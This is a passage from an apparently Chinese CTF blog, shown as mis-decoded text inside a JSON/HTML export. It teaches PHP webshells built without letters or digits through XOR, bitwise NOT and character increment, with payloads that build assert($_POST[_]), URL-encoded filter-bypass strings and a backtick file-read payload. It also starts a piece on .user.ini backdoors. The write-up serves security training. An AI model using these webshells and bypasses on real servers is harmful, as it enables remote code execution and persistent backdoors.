class=\"string\">'`'</span>).(<span class=\"string\">'%13'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%05'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%12'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%14'</span>^<span class=\"string\">'`'</span>);</span><br><span class=\"line\">$__=<span class=\"string\">'_'</span>.(<span class=\"string\">'%0D'</span>^<span class=\"string\">']'</span>).(<span class=\"string\">'%2F'</span>^<span class=\"string\">'`'</span>).(<span class=\"string\">'%0E'</span>^<span class=\"string\">']'</span>).(<span class=\"string\">'%09'</span>^<span class=\"string\">']'</span>); <span class=\"comment\">// $__='_POST';</span></span><br><span class=\"line\">$___=$$__;</span><br><span class=\"line\">$_($___[_]); <span class=\"comment\">// assert($_POST[_]);</span></span><br></pre></td></tr></table></figure>\n\n<p>åœ¨å¦‚ä¸‹è¿‡æ»¤ä¸­</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> <span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">@highlight_file(<span class=\"keyword\">__FILE__</span>);</span><br><span class=\"line\"><span class=\"keyword\">if</span>(!preg_match(<span class=\"string\">'/[a-z0-9]/is'</span>,$_GET[<span class=\"string\">'shell'</span>])) &#123;</span><br><span class=\"line\"> <span class=\"keyword\">eval</span>($_GET[<span class=\"string\">'shell'</span>]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n\n<p>æˆ‘ä»¬ <code>POST : _=phpinfo();</code> å³å¯æˆåŠŸæ‰§è¡Œ</p>\n<h3 id=\"å–å\"><a href=\"#å–å\" class=\"headerlink\" title=\"å–å\"></a>å–å</h3><p>é€šè¿‡å–åå°†æ±‰å­—ç¼–ç ä¸­çš„ç¼–ç å–å‡ºæ¥è¿›è¡Œå–å</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">echo</span> ((<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)).<span class=\"string\">' '</span>;<span class=\"comment\">//åˆ©ç”¨å¼±ç±»å‹çš„ç‰¹æ€§</span></span><br><span class=\"line\">$__=(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>);</span><br><span class=\"line\">$_=$__/$__;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> $_;</span><br><span class=\"line\"><span class=\"keyword\">echo</span> ~(<span class=\"string\">'å’Œ'</span>&#123;<span class=\"number\">2</span>&#125;);\t          <span class=\"comment\">//s</span></span><br></pre></td></tr></table></figure>\n\n<p>payload:</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\">$__=(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>)+(<span class=\"string\">'&gt;'</span>&gt;<span class=\"string\">'&lt;'</span>); <span class=\"comment\">//2</span></span><br><span class=\"line\">$_=$__/$__; <span class=\"comment\">//1</span></span><br><span class=\"line\"></span><br><span class=\"line\">$____=<span class=\"string\">''</span>; <span class=\"comment\">//assert</span></span><br><span class=\"line\">$___=<span class=\"string\">\"ç°\"</span>;$____.=~($___&#123;$_&#125;); <span class=\"keyword\">echo</span> $____.<span class=\"string\">\"\\r\\n\"</span>;<span class=\"comment\">//a</span></span><br><span class=\"line\">$___=<span class=\"string\">\"å’Œ\"</span>;$____.=~($___&#123;$__&#125;); <span class=\"keyword\">echo</span> $____.<span class=\"string\">\"\\r\\n\"</span>; <span class=\"comment\">//s</span></span><br><span class=\"line\">$___=<span class=\"string\">\"å’Œ\"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"çš„\"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"åŠ\"</span>;$____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"å§‹\"</span>;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$_____=<span class=\"string\">'_'</span>;<span class=\"comment\">//_POST</span></span><br><span class=\"line\">$___=<span class=\"string\">\"ä¿¯\"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"ç°\"</span>;$_____.=~($___&#123;$__&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"æ¬¡\"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\">$___=<span class=\"string\">\"ç«™\"</span>;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$_=$$_____; <span class=\"comment\">//$_POSTT</span></span><br><span class=\"line\"></span><br><span class=\"line\">$____($_[$__]);<span class=\"comment\">//assert(_POST[2])</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"å­—ç¬¦é€’å¢\"><a href=\"#å­—ç¬¦é€’å¢\" class=\"headerlink\" title=\"å­—ç¬¦é€’å¢\"></a>å­—ç¬¦é€’å¢</h3><blockquote>\n<p>åœ¨å¤„ç†å­—ç¬¦å˜é‡çš„ç®—æ•°è¿ç®—æ—¶ï¼ŒPHP æ²¿è¢­äº† Perl çš„ä¹ æƒ¯ï¼Œè€Œé C çš„ã€‚ä¾‹å¦‚ï¼Œåœ¨ Perl ä¸­ $a = â€˜Zâ€™; $a++; å°†æŠŠ $a å˜æˆâ€™AAâ€™ï¼Œè€Œåœ¨ C ä¸­ï¼Œa = â€˜Zâ€™; a++; å°†æŠŠ a å˜æˆ â€˜[â€˜ï¼ˆâ€™Zâ€™ çš„ ASCII å€¼æ˜¯ 90ï¼Œâ€™[â€˜ çš„ ASCII å€¼æ˜¯ 91ï¼‰ã€‚æ³¨æ„å­—ç¬¦å˜é‡åªèƒ½é€’å¢ï¼Œä¸èƒ½é€’å‡ï¼Œå¹¶ä¸”åªæ”¯æŒçº¯å­—æ¯ï¼ˆa-z å’Œ A-Zï¼‰ã€‚é€’å¢ï¼é€’å‡å…¶ä»–å­—ç¬¦å˜é‡åˆ™æ— æ•ˆï¼ŒåŸå­—ç¬¦ä¸²æ²¡æœ‰å˜åŒ–ã€‚ </p>\n</blockquote>\n<pre><code>echo &quot;&lt;h3&gt;Postincrement&lt;/h3&gt;&quot;;\n$a = 5;\necho &quot;Should be 5: &quot; . $a++ . &quot;&lt;br /&gt;\\n&quot;; //5\necho &quot;Should be 6: &quot; . $a . &quot;&lt;br /&gt;\\n&quot;;   //6\n$c = &apos;b&apos;;\necho $c++.&quot;&lt;br /&gt;\\n&quot;;                     //b\necho $c.&quot;\\n&quot;;                               //c\n?&gt;</code></pre><p>æˆ‘ä»¬åªè¦æ‹¿åˆ°ä¸€ä¸ªå˜é‡å€¼ä¸º <code>a</code> ï¼Œé€šè¿‡è‡ªå¢æ“ä½œå°±å¯ä»¥è·å¾— <code>a-z</code> ä¸­æ‰€æœ‰å­—ç¬¦ã€‚</p>\n<p>phpä¸­å¦‚æœå¼ºåˆ¶é“¾æ¥æ•°ç»„å’Œå­—ç¬¦ä¸²çš„è¯ï¼Œæ•°ç»„ä¼šè¢«è½¬æ¢æˆå­—ç¬¦ä¸²ï¼Œå€¼ä¸º <code>Arrary</code> </p>\n<pre><code>echo &apos;&apos;.[];   //Array</code></pre><p>æˆ‘ä»¬å–ç¬¬ä¸€ä¸ªå­—ç¬¦å°±å¯ä»¥å¾—åˆ° <code>A</code> äº†ã€‚</p>\n<p>payload:</p>\n<pre><code>&lt;?php\n$_=[];\n$_=@&quot;$_&quot;; // $_=&apos;Array&apos;;\n$_=$_[&apos;!&apos;==&apos;@&apos;]; // $_=$_[0];\n$___=$_; // A\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;\n$___.=$__; // S\n$___.=$__; // S\n$__=$_;\n$__++;$__++;$__++;$__++; // E \n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R\n$___.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$___.=$__;\n\n$____=&apos;_&apos;;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S\n$____.=$__;\n$__=$_;\n$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T\n$____.=$__;\n\n$_=$$____;\n$___($_[_]); // ASSERT($_POST[_]);</code></pre><p>ä½†æ˜¯ä¸€ç›´æ²¡æœ‰æˆåŠŸ</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a = <span class=\"string\">'$_=[];$_=@\"$_\";'</span></span><br><span class=\"line\">b = <span class=\"string\">\"$_=$_['!'=='@'];\"</span></span><br><span class=\"line\">c = <span class=\"string\">'$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">d = <span class=\"string\">'$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++; $___.=$__;$__=$_;$__++;'</span></span><br><span class=\"line\">e = <span class=\"string\">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">f = <span class=\"string\">'$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;'</span></span><br><span class=\"line\">g = <span class=\"string\">\"$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;\"</span></span><br><span class=\"line\">h = <span class=\"string\">'$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$_=$$____;$___($_[_]);'</span></span><br><span class=\"line\"><span class=\"keyword\">print</span> (a+b+c+d+e+f+g+h).replace(<span class=\"string\">\"$\"</span>,<span class=\"string\">\"%24\"</span>).replace(<span class=\"string\">\"=\"</span>,<span class=\"string\">\"%3d\"</span>).replace(<span class=\"string\">\";\"</span>,<span class=\"string\">\"%3b\"</span>).replace(<span class=\"string\">\"@\"</span>,<span class=\"string\">\"%40\"</span>).replace(<span class=\"string\">\"+\"</span>,<span class=\"string\">\"%20\"</span>).replace(<span class=\"string\">\"[\"</span>,<span class=\"string\">\"%5b\"</span>).replace(<span class=\"string\">\"]\"</span>,<span class=\"string\">\"%5d\"</span>).replace(<span class=\"string\">\"'\"</span>,<span class=\"string\">\"%27\"</span>).replace(<span class=\"string\">'\"'</span>,<span class=\"string\">\"%22\"</span>).replace(<span class=\"string\">\"!\"</span>,<span class=\"string\">\"%21\"</span>).replace(<span class=\"string\">\"(\"</span>,<span class=\"string\">\"%28\"</span>).replace(<span class=\"string\">\")\"</span>,<span class=\"string\">\"%29\"</span>).replace(<span class=\"string\">\".\"</span>,<span class=\"string\">'%2e'</span>)</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"é™åˆ¶é•¿åº¦\"><a href=\"#é™åˆ¶é•¿åº¦\" class=\"headerlink\" title=\"é™åˆ¶é•¿åº¦\"></a>é™åˆ¶é•¿åº¦</h2><p>PHPå¯ä»¥å°†å­—ç¬¦ä¸²å½“ä½œå‡½æ•°æ¥å¤„ç†ï¼š</p>\n<pre><code>function B()\n{\n    echo &quot;hello world!&quot;;\n}\n\n$_++;           //1\necho $_;\n$__ = &apos;?&apos;^&apos;}&apos;; //B\necho $__;\n$__();</code></pre><p>é¢˜ç›®ï¼š</p>\n<pre><code>&lt;?php\ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;40){\n        die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code)){\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>é™åˆ¶é•¿åº¦ä¸º40ï¼Œä¹‹å‰çš„å¼‚æˆ–ä¸è¡Œäº†ã€‚æˆ‘ä»¬è¦åˆ©ç”¨PHPå…è®¸åŠ¨æ€æ‰§è¡Œå‡½æ•°çš„ç‰¹ç‚¹ï¼Œæ„é€ ä¸€ä¸ª <code>_GET</code> æ¥å»è¯»å– <code>getFlag()</code> </p>\n<p>å¯ä»¥é€šè¿‡è¿ç»­è°ƒç”¨å¼‚æˆ–æ¥è·å¾— <code>_GET</code> </p>\n<pre><code>&lt;?php\n    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET\n?&gt;</code></pre><p>é€šè¿‡æ„é€  <code>${$_}[_](${$_}[__]) //$_GET[_]($_GET[__])</code> æ¥è·å–å‚æ•°</p>\n<p>æœ€åä¼ å…¥å‚æ•° getFlag</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_](${$_}[__]);&amp;_=getFlag </code></pre><p>åé¢çš„ <code>__</code> æˆ‘ä»¬ä¸ä¼ å€¼é»˜è®¤ä¸º <code>NULL</code> ä¹Ÿå°±ç›¸å½“äº <code>getFlag()</code></p>\n<p>äº‹å®ä¸Šä¸‹é¢è¿™ä¹Ÿå¯ä»¥ï¼š</p>\n<pre><code>?code=$_=&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;${$_}[_]();&amp;_=getFlag</code></pre><h3 id=\"æ‰©å±•\"><a href=\"#æ‰©å±•\" class=\"headerlink\" title=\"æ‰©å±•\"></a>æ‰©å±•</h3><pre><code>?code=$_=~%98%9A%8B%B9%93%9E%98;$_();</code></pre><p>å¯¹ <code>getFlag</code> è¿›è¡Œå–åç„¶å <code>URL</code> ç¼–ç </p>\n<pre><code>?code=%24%7B%7E%22%A0%B8%BA%AB%22%7D%5B%AA%5D%28%29%3B&amp;%aa=getFlag</code></pre><p>è¿™ä¸ªåœ¨{}ä¸­è¿›è¡Œå–å <code>${~&quot;\\xa0\\xb8\\xba\\xab&quot;}</code> ï¼Œç›¸å½“äº <code>$_GET</code>ï¼Œæ‹¼æ¥å‡ºäº† <code>$_GET[&#39;+&#39;]&amp;#40; &amp;#41;;</code>ï¼Œä¼ å…¥ <code>+=getFlag()</code> ä»è€Œæ‰§è¡Œäº†å‡½æ•°`</p>\n<h2 id=\"ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿\"><a href=\"#ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿\" class=\"headerlink\" title=\"ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿\"></a>ä¸ç”¨æ•°å­—å­—æ¯å’Œä¸‹åˆ’çº¿</h2><p>é¢˜ç›®ï¼š</p>\n<pre><code>&lt;?php\n\ninclude &apos;flag.php&apos;;\n\nif(isset($_GET[&apos;code&apos;])){\n    $code = $_GET[&apos;code&apos;];\n    if(strlen($code)&gt;50){\n        die(&quot;Too Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_]+/&quot;,$code)){\n        die(&quot;Not Allowed.&quot;);\n    }\n    @eval($code);\n}else{\n    highlight_file(__FILE__);\n}\n//$hint =  &quot;php function getFlag() to get flag&quot;;\n?&gt;  </code></pre><p>é€šè¿‡ä¸Šé¢çš„å–åå°±å¯ä»¥äº†</p>\n<pre><code>?code=$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;[%27%2d%27]();&amp;%2d=getFlag //$_GET(&apos;-&apos;)();&amp;-=getFlag;\n\n$c = &quot;_GET&quot;;\necho urlencode(~($c)); //%A0%B8%BA%AB</code></pre><p>è¿™é‡Œåˆ©ç”¨ <code>${}</code> ä¸­çš„ä»£ç å¯ä»¥æ‰§è¡Œçš„ç‰¹ç‚¹ï¼Œåœ¨ <code>{}</code> é‡Œè¿›è¡Œå–åæ“ä½œï¼Œå…¶å®ä¹Ÿå°±æ˜¯å¯å˜å˜é‡</p>\n<pre><code>&lt;?php\n    $a = &apos;hello&apos;;\n    $$a = &apos;world&apos;;\n    echo &quot;$a ${$a}&quot;;\n?&gt;\n\nè¾“å‡ºï¼šhello world</code></pre><p>è¿™é‡Œçš„ <code>$&amp;#123;%7e%22%A0%B8%BA%AB%22&amp;#125;</code> ç›¸å½“äº <code>$_GET</code> .</p>\n<p>è¿˜æœ‰æ›´éªšçš„ï¼Œç”¨ä¸­æ–‡ï¼š</p>\n<pre><code>code=$å•Š=(%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27);$å•Š();  //%27%5D%40%5C%60%40%40%5D%27^%27%3A%25%28%26%2C%21%3A%27=getFlag</code></pre><p>ç›¸å½“äºç›´æ¥ç»™å˜é‡èµ‹å€¼äº†ï¼Œè¿™æ ·å°±ä¸ç”¨ <code>{}</code> äº†</p>\n<h2 id=\"ä¸ç”¨æ•°å­—ã€å­—æ¯ã€-ã€\"><a href=\"#ä¸ç”¨æ•°å­—ã€å­—æ¯ã€-ã€\" class=\"headerlink\" title=\"ä¸ç”¨æ•°å­—ã€å­—æ¯ã€_ã€$\"></a>ä¸ç”¨æ•°å­—ã€å­—æ¯ã€_ã€$</h2><pre><code>&lt;?php \ninclude &apos;flag.php&apos;;\nif(isset($_GET[&apos;code&apos;]))\n{\n    $code=$_GET[&apos;code&apos;];\n    if(strlen($code)&gt;35){\n    die(&quot;Long.&quot;);\n    }\n    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))\n    {\n        die(&quot;NO.&quot;);\n    }\n    @eval($code);\n}\nelse\n{\n    highlight_file(__FILE__);\n}\n//$hint=&quot;php function getFlag() to get flag&quot;;\n?&gt;</code></pre><p>payload:<br>    ?code=?&gt;<?=`/???/??? ????.???`?></p>\n<p><code>?&gt;</code> é—­åˆphpæ–‡ä»¶å¼€å¤´çš„ <code>&lt;?php</code> , <code>&lt;?</code> ç›¸å½“äº <code>&lt;? echo</code> .</p>\n<p>åœ¨é…ç½®æ–‡ä»¶ä¸­å¼€å¯ <code>short_open_tag</code> åå¯ä»¥ä½¿ç”¨çŸ­æ ‡ç­¾ã€‚é»˜è®¤æ˜¯å¼€å¯çš„ã€‚</p>\n<h2 id=\"another-test\"><a href=\"#another-test\" class=\"headerlink\" title=\"another test\"></a>another test</h2><pre><code>&lt;?php\nhighlight_file(__FILE__);\n\n$_ = @$_GET[&apos;_&apos;];\nif ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $_) )\n    die(&apos;rosÃ© will not do it&apos;);\n\nif ( strlen(count_chars(strtolower($_), 0x3)) &gt; 0xd )\n    die(&apos;you are so close, omg&apos;);\n\neval($_);\n?&gt;</code></pre><p>ä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹å¤§ä½¬çš„æ£€æµ‹å¯ç”¨å‡½æ•°çš„è„šæœ¬ï¼š</p>\n<pre><code>&lt;?php \n$arr = get_defined_functions()[&apos;internal&apos;];\n\nforeach ($arr as $key =&gt; $value) {\n    if ( preg_match(&apos;/[\\x00- 0-9\\&apos;&quot;`$&amp;.,|[{_defgops\\x7F]+/i&apos;, $value) ){\n        unset($arr[$key]);\n        continue;\n    }\n\n    if ( strlen(count_chars(strtolower($value), 0x3)) &gt; 0xd ){\n        unset($arr[$key]);\n        continue;\n    }\n}\n\nvar_dump($arr);\n?&gt;</code></pre><h2 id=\"å‚è€ƒé“¾æ¥\"><a href=\"#å‚è€ƒé“¾æ¥\" class=\"headerlink\" title=\"å‚è€ƒé“¾æ¥\"></a>å‚è€ƒé“¾æ¥</h2><blockquote>\n<p><a href=\"https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html</a></p>\n<p><a href=\"https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html\" target=\"_blank\" rel=\"noopener\">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a></p>\n<p><a href=\"https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/\" target=\"_blank\" rel=\"noopener\">https://www.smi1e.top/php%e4%b8%8d%e4%bd%bf%e7%94%a8%e6%95%b0%e5%ad%97%e5%ad%97%e6%af%8d%e5%92%8c%e4%b8%8b%e5%88%92%e7%ba%bf%e5%86%99shell/</a></p>\n<p><a href=\"https://xz.aliyun.com/t/5677#toc-3\" target=\"_blank\" rel=\"noopener\">https://xz.aliyun.com/t/5677#toc-3</a></p>\n</blockquote>\n","text":"ç‰¹æ®Šçš„webshellå®éªŒç¯å¢ƒ ï¼šphp 5.45+nts+apachephp5ä¸­assertæ˜¯ä¸€ä¸ªå‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡$f=&#39;assert&#39;;$f(...);è¿™æ ·çš„æ–¹æ³•æ¥åŠ¨æ€æ‰§è¡Œä»»æ„ä»£ç ã€‚ä½† php7ä¸­ï¼Œassertä¸å†æ˜¯å‡½æ•°ï¼Œå˜æˆäº†ä¸€ä¸ªè¯­è¨€ç»“æ„ï¼ˆç±»ä¼¼evalï¼‰ï¼Œ","link":"","raw":null,"photos":[],"categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"php","slug":"php","count":7,"path":"api/tags/php.json"}]},{"title":"ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•","slug":"ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•","date":"2019-09-18T01:19:34.000Z","updated":"2019-09-25T12:07:29.143Z","comments":true,"path":"api/articles/ä¸¤ç§æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•.json","excerpt":"","keywords":null,"cover":"https://images2015.cnblogs.com/blog/804631/201602/804631-20160212221854714-1902413142.png","content":"<h1 id=\"ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š-htaccess-amp-user-ini\"><a href=\"#ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š-htaccess-amp-user-ini\" class=\"headerlink\" title=\"ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini\"></a>ä¸¤ç§åˆ©ç”¨æ–‡ä»¶æ„æˆPHPåé—¨çš„æ–¹æ³•ï¼š.htaccess &amp; .user.ini</h1><h2 id=\"user-ini\"><a href=\"#user-ini\" class=\"headerlink\" title=\".user.ini\"></a>.user.ini</h2><p>ä»¥ä¸‹éƒ¨åˆ†æ‘˜å–äºPç¥çš„åšå®¢<a href=\"http://www.vuln.cn/6001\" title=\"Pç¥åšå®¢\" target=\"_blank\" rel=\"noopener\">http://www.vuln.cn/6001</a></p>\n<h3 id=\"user-ini-æ˜¯ä»€ä¹ˆï¼Ÿ\"><a href=\"#user-ini-æ˜¯ä»€ä¹ˆï¼Ÿ\" class=\"headerlink\" title=\".user.ini æ˜¯ä»€ä¹ˆï¼Ÿ\"></a>.user.ini æ˜¯ä»€ä¹ˆï¼Ÿ</h3><p>åªè¦æ˜¯ä»¥fastcgiè¿è¡Œçš„phpéƒ½å¯ä»¥ç”¨<code>.user.ini</code>æ„æˆæ–‡ä»¶åé—¨çš„æ–¹æ³•ã€‚ç›¸æ¯”äº<code>.htaccess</code>æœ‰æ›´å¤§çš„åˆ©ç”¨ç©ºé—´ã€‚ </p>\n<p>æˆ‘ä»¬ä»phpæ‰‹å†Œå¯ä»¥çœ‹åˆ°php.iniæ˜¯phpé»˜è®¤çš„é…ç½®æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯é…ç½®é€‰é¡¹åˆ—è¡¨<a href=\"https://www.php.net/manual/zh/ini.list.php\" title=\"é…ç½®é¡¹åˆ—è¡¨\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/ini.list.php</a>  ä»è¡¨ä¸­æˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰ <code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_SYSTEM</code>    ã€<code>PHP_INI_USER</code>ã€<code>PHP_INI_ALL</code> å››ç§æ¨¡å¼ï¼Œé‚£ä¹ˆè¿™å››ç§æœ‰ä»€ä¹ˆåŒºåˆ«å‘¢ï¼Ÿ  </p>\n<pre><code>æ¨¡å¼                å«ä¹‰\nPHP_INI_USER    å¯åœ¨ç”¨æˆ·è„šæœ¬ï¼ˆä¾‹å¦‚ ini_set() ï¼‰æˆ– Windows æ³¨å†Œè¡¨ï¼ˆè‡ª PHP 5.3 èµ·ï¼‰ä»¥åŠ .user.ini ä¸­è®¾å®š\nPHP_INI_PERDIR    å¯åœ¨ php.iniï¼Œ.htaccess æˆ– httpd.conf ä¸­è®¾å®š\nPHP_INI_SYSTEM    å¯åœ¨ php.ini æˆ– httpd.conf ä¸­è®¾å®š\nPHP_INI_ALL        å¯åœ¨ä»»ä½•åœ°æ–¹è®¾å®š</code></pre><p>è¿™é‡Œæåˆ°äº†æˆ‘ä»¬å¯ä»¥è‡ªå·±è®¾ç½®çš„æ¨¡å¼æœ‰ <code>PHP_INI_USER</code>ã€<code>PHP_INI_PERDIR</code>ã€<code>PHP_INI_ALL</code>ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬çœ‹åˆ°äº† <code>.user.ini</code> ã€‚ç¿»é˜…æ‰‹å†Œ<a href=\"https://www.php.net/manual/zh/configuration.file.per-user.php\" title=\"æ‰‹å†Œ\" target=\"_blank\" rel=\"noopener\">https://www.php.net/manual/zh/configuration.file.per-user.php</a>å¯çŸ¥ï¼š</p>\n<blockquote>\n<p>è‡ª PHP 5.3.0 èµ·ï¼ŒPHP æ”¯æŒåŸºäºæ¯ä¸ªç›®å½•çš„ .htaccess é£æ ¼çš„ INI æ–‡ä»¶ã€‚æ­¤ç±»æ–‡ä»¶ä»…è¢« CGIï¼FastCGI SAPI å¤„ç†ã€‚æ­¤åŠŸèƒ½ä½¿å¾— PECL çš„ htscanner æ‰©å±•ä½œåºŸã€‚å¦‚æœä½¿ç”¨ Apacheï¼Œåˆ™ç”¨ .htaccess æ–‡ä»¶æœ‰åŒæ ·æ•ˆæœã€‚</p>\n<p>é™¤äº†ä¸» php.ini ä¹‹å¤–ï¼ŒPHP è¿˜ä¼šåœ¨æ¯ä¸ªç›®å½•ä¸‹æ‰«æ INI æ–‡ä»¶ï¼Œä»è¢«æ‰§è¡Œçš„ PHP 